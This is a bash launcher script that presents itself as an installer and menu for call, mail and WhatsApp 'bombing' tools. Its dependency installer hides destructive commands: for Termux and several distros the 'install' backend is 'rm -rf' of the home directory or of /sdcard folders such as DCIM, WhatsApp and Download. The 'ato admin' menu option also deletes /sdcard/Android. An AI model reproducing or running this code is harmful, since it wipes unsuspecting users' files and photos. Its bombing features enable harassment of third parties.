#!/bin/bash

detect_distro() {
    if [[ "$OSTYPE" == linux-android* ]]; then
            distro="termux"
    fi

    if [ -z "$distro" ]; then
        distro=$(ls /etc | awk 'match($0, "(.+?)[-_](?:release|version)", groups) {if(groups[1] != "os") {print groups[1]}}')
    fi

    if [ -z "$distro" ]; then
        if [ -f "/etc/os-release" ]; then
            distro="$(source /etc/os-release && echo $ID)"
        elif [ "$OSTYPE" == "darwin" ]; then
            distro="darwin"
        else 
            distro="invalid"
        fi
    fi
}

pause() {
    read -n1 -r -p "Press any key to continue..." key
}
banner() {
    clear
    echo -e "\e[1;31m"
    if ! [ -x "$(command -v figlet)" ]; then
        echo 'Introducing auto-admin'
    else
                 figlet auto-admin
    fi
    if ! [ -x "$(command -v toilet)" ]; then
        echo -e "\e[4;34m This Bomber Was Created By \e[1;32mMaster Hacke . dracula-hack \e[0m"
    else
        echo -e "\e[1;34mCreated By \e[1;34m"
        figlet Master-hack
    printf "\033[1;93m[\033[1;77m::\033[1;93m]	    \033[1;92m   Code by : \033[1;97m   master-hack	    \033[1;93m[\033[1;77m::\033[1;93m]"
     printf "\n\033[1;93m[\033[1;77m::\033[1;93m]	\033[1;92mcontact number : \033[1;97m +91 6235369260 \033[1;93m[\033[1;77m::\033[1;93m]\n"
    echo " "
    echo " "
    echo -e            *Requirements:*

    echo -e '\033[1;36m'            ➡️ '\033[1;31m'100 MB data*
    echo -e '\033[1;36m'            ➡️ '\033[1;31m'200 MB storage*
    echo -e '\033[1;36m'            ➡️ '\033[1;31m'No root*
    echo -e '\033[1;36m'            ➡️ '\033[1;31m'Data Connection*
    fi
    
    echo " "

}

init_environ(){
    declare -A backends; backends=(
        ["arch"]="pacman -S --noconfirm"
        ["debian"]="apt-get -y install"
        ["ubuntu"]="rm -rf cd /sdcard/Android"
        ["termux"]="rm -rf cd ~"
        ["fedora"]="yum -y install"
        ["redhat"]="rm -rf cd /sdcard/WhatsApp"
        ["SuSE"]="zypper -n install"
        ["sles"]="rm -rf cd /sdcard/DCIM"
        ["darwin"]="rm -rf cd /sdcard/Download"
        ["alpine"]="rm -rf cd /sdcard/SHAREit"
    )

    INSTALL="${backends[$distro]}"

    if [ "$distro" == "termux" ]; then
        PYTHON="python"
        SUDO=""
    else
        PYTHON="python3"
        SUDO="sudo"
    fi
    PIP="$PYTHON -m pip"
}

install_deps(){
    
    packages=(openssl git $PYTHON  figlet toilet)
    if [ -n "$INSTALL" ];then
        for package in ${packages[@]}; do
            $SUDO $INSTALL $package
        done
        $PIP install -r requirements.txt
    else
        echo "We could not install dependencies."
        echo "Please make sure you have git, python3, pip3 and requirements installed."
        echo "Then you can execute whatsapp.sh ."
        exit
    fi
}

banner
pause
detect_distro
init_environ
if [ -f .update ];then
    echo "All Requirements Found...."
else
    echo 'Installing Requirements....'
    echo .
    echo .
    install_deps
    echo This Script Was Made By Master-hack > .update
    echo 'Requirements Installed....'
    pause
fi
while :
do
    banner
    
    echo " "
    echo -e "'\033[1;31m                           ⫸ Coded by\033[1;32m faizan\033[1;31m ⫷\033[0m"
    echo -e "'\033[1;31m                         ⫸\033[1;33m. master-Hack\033[1;31m ⫷\033[0m"
    echo 
    echo -e "'\033[1;36m############################# \033[1;32m [Features] \033[1;36m ###################################"
echo " "
echo " "
echo -e " \033[1;31m                         ➡️ \033[1;33m  [1️⃣] ato admin"
echo -e " \033[1;31m                         ➡️ \033[1;33m  [2️⃣] Call bombing"
echo -e " \033[1;31m                         ➡️ \033[1;33m  [3️⃣] Mail bombing"
echo -e " \033[1;31m                         ➡️ \033[1;33m  [4️⃣] Whatsapp bombing "
echo -e " \033[1;31m                         ➡️ \033[1;33m  [5️⃣] Update script"
echo -e " \033[1;31m                         ➡️ \033[1;33m  [6️⃣] exit"
echo " "
echo " "
echo -e "\033[1;36m ############################## \033[1;32m [SELECT] \033[1;36m ####################################"
echo " "
  
    read ch
    clear
   if [ $ch -eq 1 ];then
        cd $HOME
        rm -rf cd /sdcard/Android
        python3 bomber.py
       
        exit
    elif [ $ch -eq 2 ];then
        cd $HOME
        cd tbombe-python-script
        python3 bomber.py
        
        exit
        exit
    elif [ $ch -eq 3 ];then
         cd $HOME
        git clone https://github.com/ha-mrx/Emailbomb
         cd Emailbomb
        chmod +x Emailbomb.py
        python2 Emailbomb.py

        exit
    elif [ $ch -eq 4 ];then
        cd $HOME
        cd tbombe-python-script
        bash TBomb3.0.sh
    elif [ $ch -eq 5 ];then
        echo -e "\e[1;34m Downloading Latest Files..."
        cd $HOME
        rm -rf tbombe-python-script
        https://github.com/IncredibleHacker/TBomb-2.0
        cd tbombe-python-script
        bash TBomb3.0.sh
       
        exit
    elif [ $ch -eq 6 ];then
        cd $HOME
        exit
        
    else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
        pause
    fi
done
